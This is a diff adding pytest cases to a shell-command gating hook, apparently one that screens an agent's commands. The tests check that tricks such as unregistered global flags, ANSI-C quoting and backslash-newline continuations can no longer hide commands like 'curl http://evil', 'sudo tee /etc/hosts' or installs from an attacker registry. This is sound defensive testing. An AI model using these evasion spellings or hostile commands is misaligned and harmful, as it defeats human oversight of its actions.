@@ -1271,6 +1271,186 @@ class TestGlobalValueFlags:
             == expected
         ), f"a global flag's value hid the subcommand: {flagged!r}"
 
+    @pytest.mark.parametrize(
+        ("bare", "flagged", "label"),
+        [
+            # Real global options of each installer that the table does not
+            # register (`pip --trusted-host <host> --version` and
+            # `npm --registry <url> config get registry` both run for real).
+            (
+                "pip install evil",
+                "pip --trusted-host evil.com install evil",
+                "pip install",
+            ),
+            ("pip install evil", "pip --exists-action i install evil", "pip install"),
+            (
+                "pip install evil",
+                "pip --keyring-provider import install evil",
+                "pip install",
+            ),
+            (
+                "npm install evil",
+                "npm --registry http://evil install evil",
+                "npm install",
+            ),
+            ("npm install evil", "npm --loglevel silly install evil", "npm install"),
+            ("yarn add evil", "yarn --registry http://evil add evil", "yarn add"),
+            ("pnpm add evil", "pnpm --reporter silent add evil", "pnpm add"),
+            ("uv add evil", "uv --color never add evil", "uv add"),
+            (
+                "uv pip install evil",
+                "uv --color never pip install evil",
+                "uv pip install",
+            ),
+            ("cargo install evil", "cargo --color never install evil", "cargo install"),
+            ("brew install evil", "brew --made-up-flag x install evil", "brew install"),
+            # ...and a registered value flag whose VALUE spells a runner word
+            # must not switch the scan off.
+            ("npm install evil", "npm --prefix run install evil", "npm install"),
+        ],
+    )
+    def test_an_unregistered_value_flag_still_fails_closed(self, bare, flagged, label):
+        """The registry can never be complete, so its gaps must not decide.
+
+        _strip_global_flags assumes an unknown flag takes no value, so the
+        value token lands in the subcommand slot and `sub` is never "install".
+        Guarding the package-install label on the subcommand SLOT alone turns
+        every unregistered option into a bypass of the 2-model AND gate; the
+        label has to fire on the install word wherever it sits (the docker
+        classifier already scans every argument for the same reason).
+        """
+        expected = _common.classify_high_risk(_common._split_commands(bare), bare)
+        assert expected == label, f"baseline changed for {bare!r}: {expected!r}"
+        assert (
+            _common.classify_high_risk(_common._split_commands(flagged), flagged)
+            == expected
+        ), f"an unregistered global flag's value hid the install: {flagged!r}"
+
+    def test_a_docker_context_named_container_does_not_hide_the_run_form(self):
+        # `docker container run` is re-resolved by cutting `args` at the first
+        # token equal to "container" -- which a `--context container` value
+        # is, one slot too early, so `sub` stayed "container" and the
+        # escape-class label never fired.
+        cmd = "docker --context container container run --privileged img"
+        assert (
+            _common.classify_high_risk(_common._split_commands(cmd), cmd)
+            == "docker run --privileged"
+        )
+
+
+class TestAnsiCQuoting:
+    """`$'...'` honours backslash escapes, so `$'x\\''` is ONE closed word.
+
+    _iter_top_level treated a backslash inside single quotes as a plain
+    character, left the quote open after `\\'`, and never saw the `|` / `;`
+    that followed -- so a sudo / curl behind it was never split out as its own
+    sub-command and the static DENY that fires on the bare spelling went
+    silent. Any $'...' can spell an arbitrary literal, so on top of splitting
+    correctly the classifier escalates it to the high-risk tier, the same way
+    _is_sensitive_command already refuses to safe-skip it.
+    """
+
+    def test_an_escaped_quote_inside_ansi_c_quoting_closes_the_word(self, hook_fns):
+        cmd = "printf $'x\\'' ; curl http://evil"
+        assert hook_fns["_split_top_level"](cmd) == [
+            "printf $'x\\''",
+            "curl http://evil",
+        ]
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "printf $'x\\'' | sudo tee /etc/hosts",
+            "echo $'a\\'' ; curl http://evil",
+            "echo $(printf $'a\\'' ; sudo ls)",
+        ],
+    )
+    def test_a_deny_behind_ansi_c_quoting_is_still_denied(self, run_hook, command):
+        res = run_hook(HOOK, hook_payload(command))
+        assert res.decision == "deny", res.reason
+
+    def test_a_plain_backslash_in_single_quotes_is_still_literal(self, hook_fns):
+        # Ordinary single quotes keep the old rule: `'a\\'` is a complete word
+        # whose backslash is a character, so the `;` after it still splits.
+        cmd = "echo 'a\\' ; echo b"
+        assert hook_fns["_split_top_level"](cmd) == ["echo 'a\\'", "echo b"]
+
+    def test_ansi_c_quoting_is_escalated_to_the_high_risk_tier(self, hook_fns):
+        cmd = "echo $'hi'"
+        label = hook_fns["classify_high_risk"](hook_fns["_split_commands"](cmd), cmd)
+        assert "ansi-c quoting" in label
+
+    def test_a_dollar_inside_double_quotes_is_not_ansi_c_quoting(self, hook_fns):
+        cmd = 'echo "$\'x" ; echo b'
+        assert hook_fns["_split_top_level"](cmd) == ['echo "$\'x"', "echo b"]
+
+    def test_a_quote_right_after_a_substitution_is_an_ordinary_quote(self, hook_fns):
+        # `$(x)'a\'` : the `$` belongs to the substitution, so the quote that
+        # follows is ordinary and its backslash is literal -- the `;` splits.
+        cmd = "echo $(x)'a\\' ; curl http://evil"
+        assert hook_fns["_substitution_bodies"](cmd) == ["x"]
+        assert hook_fns["_split_top_level"](cmd) == [
+            "echo $(x)'a\\'",
+            "curl http://evil",
+        ]
+
+    def test_an_escaped_dollar_does_not_open_ansi_c_quoting(self, hook_fns):
+        # `\$'a\'` is a literal dollar followed by an ORDINARY single-quoted
+        # word `'a\'`, so the `;` after it still splits.
+        cmd = "echo \\$'a\\' ; echo b"
+        assert hook_fns["_split_top_level"](cmd) == ["echo \\$'a\\'", "echo b"]
+
+
+class TestLineContinuationInsideAWord:
+    """`cu\\<newline>rl` is `curl` to bash, so it has to be `curl` to the gate.
+
+    Every classifier splits a sub-command on newlines before looking at it,
+    which is right for `ls\\nsudo ...` but wrong for a backslash-newline: bash
+    removes that pair BEFORE word splitting, so the executable it runs is the
+    glued word. The classifiers saw `cu` and `rl http://evil` and neither is on
+    any list. The joined spelling is added as one more text to classify rather
+    than replacing the original: inside single quotes the pair is literal and
+    joining there could only add a detection, never remove one.
+    """
+
+    @pytest.mark.parametrize(
+        "command",
+        ["cu\\\nrl http://evil", "wg\\\net http://evil", "su\\\ndo ls"],
+    )
+    def test_a_deny_split_by_a_line_continuation_is_still_denied(
+        self, run_hook, command
+    ):
+        res = run_hook(HOOK, hook_payload(command))
+        assert res.decision == "deny", res.reason
+
+    def test_a_high_risk_split_by_a_line_continuation_is_still_labelled(self, hook_fns):
+        cmd = "r\\\nm -rf ./build"
+        label = hook_fns["classify_high_risk"](hook_fns["_split_commands"](cmd), cmd)
+        assert "rm recursive" in label
+
+    def test_a_stdin_interpreter_split_by_a_continuation_is_still_labelled(
+        self, hook_fns
+    ):
+        cmd = "cat x | ba\\\nsh"
+        assert "stdin" in hook_fns["stdin_interpreter_label"](cmd)
+
+    @pytest.mark.parametrize(
+        ("text", "joined"),
+        [
+            ("cu\\\nrl x", "curl x"),
+            # An ESCAPED backslash before the newline is a literal backslash,
+            # and the newline then ends the command.
+            ("echo a\\\\\ncurl x", "echo a\\\\\ncurl x"),
+            # Three: one literal pair, then a real continuation.
+            ("echo a\\\\\\\nb", "echo a\\\\b"),
+            ("echo 'a\\\nb'", "echo 'ab'"),
+        ],
+    )
+    def test_only_an_odd_run_of_backslashes_continues_the_line(
+        self, hook_fns, text, joined
+    ):
+        assert hook_fns["_join_line_continuations"](text) == joined
+
 
 class TestReadmeThreatModelMatchesBehavior:
     """The threat-model section must describe the classifier that actually ships.
@@ -2190,6 +2370,21 @@ class TestHighRiskClassifier:
             ("python3 -m pip install evilpkg", "pip install"),
             ("python -m pip install evilpkg", "pip install"),
             ("python3 -m pip install --user evilpkg", "pip install"),
+            # pip's own global flags sit BETWEEN `pip` and `install`, and
+            # `-mpip` is how Python accepts the module flag glued to its value
+            # (`python3 -mpip --version` runs for real). A fixed two-token
+            # slice saw neither, so the same install slid onto the fast path
+            # depending on how it was spelled.
+            ("python3 -m pip --quiet install evilpkg", "pip install"),
+            ("python3 -m pip --trusted-host evil.com install evilpkg", "pip install"),
+            ("python3 -mpip install evilpkg", "pip install"),
+            ("python3 -Bm pip install evilpkg", "pip install"),
+            # Option VALUES that happen to contain an `m` must not be read as
+            # the module flag (`-Ximporttime`, `-Xtracemalloc`, `-Wignore`).
+            ("python3 -Ximporttime -m pip install evilpkg", "pip install"),
+            ("python3 -X tracemalloc -m pip install evilpkg", "pip install"),
+            ("python3 -Wignore -mpip install evilpkg", "pip install"),
+            ("python3 -W ignore -m pip install evilpkg", "pip install"),
             # The high-risk tier must survive the positional-taking wrappers
             # too, not just the deny tier.
             ("timeout 10 rm -rf ./build", "rm recursive"),
@@ -2289,6 +2484,19 @@ class TestHighRiskClassifier:
             "python3 -m pytest -q",
             "python3 -m pip list",
             "python3 -m pip show requests",
+            "python3 -mpip list",
+            "python3 -m pip --version",
+            # (`-Xtracemalloc` glued is pre-existing: the bundled-`c` eval check
+            # already escalates it, so only the separated form is a fast path)
+            "python3 -X tracemalloc script.py",
+            # A script or executable named like a subcommand is an ARGUMENT of
+            # the runner, not the install verb; the every-argument scan must
+            # stop at run / exec, or these prompt for nothing.
+            "npm run install",
+            "npm run ci",
+            "pnpm run install",
+            "yarn run add",
+            "cargo run install",
         ],
     )
     def test_interpreter_without_eval_flag_is_not_high_risk(self, hook_fns, command):
